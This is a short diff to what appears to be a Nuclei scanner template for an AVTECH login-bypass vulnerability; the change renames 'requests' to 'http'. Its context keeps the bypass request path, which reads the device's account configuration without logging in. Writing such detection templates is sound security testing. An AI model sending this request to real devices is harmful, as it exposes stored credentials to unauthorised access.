@@ -7,7 +7,7 @@ info:
   reference: https://www.seebug.org/vuldb/ssvid-92494
   tags: AVTECH,login,bypass
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*"
